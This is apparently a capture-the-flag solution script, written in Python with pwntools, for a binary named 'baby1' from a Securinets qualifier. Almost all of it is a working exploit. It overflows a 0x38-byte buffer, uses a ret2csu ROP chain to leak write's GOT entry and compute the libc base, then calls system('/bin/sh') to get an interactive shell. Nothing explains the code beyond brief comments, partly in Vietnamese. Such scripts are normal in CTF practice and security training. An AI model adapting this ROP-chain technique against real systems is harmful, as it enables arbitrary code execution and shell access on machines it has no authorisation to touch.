from pwn import *

a = process('./baby1')
raw_input("hello")

write_plt = 0x4004b0
write_got = 0x601018
write_offset = 0xf72b0
sys_offset = 0x45390
binsh_offset = 0x18cd57
main = 0x4005f6
read_got = 0x601020
f = ELF("./baby1")
addr_store = f.symbols["__bss_start"] + 8
binsh_store = addr_store + 8
print 'store_add: 0x%x' % addr_store
#leak write tinh libc base

pop = 0x4006BA
start_mov = 0x4006A0
buffer = 'a'*0x38           #padding
buffer += p64(pop)
buffer += p64(0x0) 			#rbx
buffer += p64(0x1) 			#rbp
buffer += p64(write_got)    #r12
buffer += p64(0x8) 			#r13
buffer += p64(write_got)    #r14 tham so
buffer += p64(0x1)          #r15
buffer += p64(start_mov)

buffer += 'a'*8
buffer += p64(0x0)        #rbx
buffer += p64(0x1)        #rbp
buffer += p64(0x0) #r12  = call
buffer += p64(0x8)        #r13
buffer += p64(0x0)   #r14  = rsi
buffer += p64(0x0)        #r15
buffer += p64(main)

a.sendline(buffer)  #sendline to leak base

a.recvuntil("Welcome to securinets Quals!\n")
write_add = u64(a.recv(8))
print "write_lib: 0x%x" % write_add

base_add = write_add - write_offset
sys_add = sys_offset + base_add
binsh_add = binsh_offset + base_add
print 'base_add: 0x%x' % base_add
print 'system_add: 0x%x' % sys_add
print 'binsh_add: 0x%x' % binsh_add


# ghi binsh libc vao mot dia chi

buffer2 = 'a'*0x38
buffer2 += p64(pop) 
buffer2 += p64(0x0)        #rbx
buffer2 += p64(0x1)        #rbp
buffer2 += p64(sys_add) #r12  = call
buffer2 += p64(0x7)        #r13
buffer2 += p64(binsh_add)   #r14  = rsi
buffer2 += p64(0x0)        #r15
buffer2 += p64(0x00000000004006c3)
buffer2 += p64(binsh_add)
buffer2 += p64(sys_add)

a.sendline(buffer2)
# a.sendline(p64(sys_add))   #sendline to write system address  	
# a.sendline(p64(binsh_add)) #sendline to write binsh string

a.interactive()

